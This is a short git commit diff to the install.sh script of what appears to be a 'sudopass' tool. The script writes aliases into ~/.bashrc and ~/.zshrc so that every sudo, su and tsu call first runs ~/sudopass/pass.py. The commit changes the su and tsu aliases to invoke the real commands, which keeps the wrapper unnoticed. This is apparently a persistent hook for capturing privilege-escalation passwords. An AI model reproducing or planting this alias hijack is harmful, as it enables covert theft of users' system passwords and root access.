bc96793855513741e96ef0afa3f164afdb442cb0
Dima-diep <52601543+Dima-diep@users.noreply.github.com>
2021-08-08 12:10:44 +0400

    install.py

--- install.sh
+++ install.sh
@@ -2,7 +2,7 @@
 apt install python -y
 echo "alias sudo='python3 ~/sudopass/pass.py && sudo'" >> ~/.bashrc
 echo "alias sudo='python3 ~/sudopass/pass.py && sudo'" >> ~/.zshrc
-echo "alias tsu='python3 ~/sudopass/pass.py && sudo'" >> ~/.bashrc
-echo "alias tsu='python3 ~/sudopass/pass.py && sudo'" >> ~/.zshrc
-echo "alias su='python3 ~/sudopass/pass.py && sudo'" >> ~/.bashrc
-echo "alias su='python3 ~/sudopass/pass.py && sudo'" >> ~/.zshrc
+echo "alias tsu='python3 ~/sudopass/pass.py && tsu'" >> ~/.bashrc
+echo "alias tsu='python3 ~/sudopass/pass.py && tsu'" >> ~/.zshrc
+echo "alias su='python3 ~/sudopass/pass.py && su'" >> ~/.bashrc
+echo "alias su='python3 ~/sudopass/pass.py && su'" >> ~/.zshrc
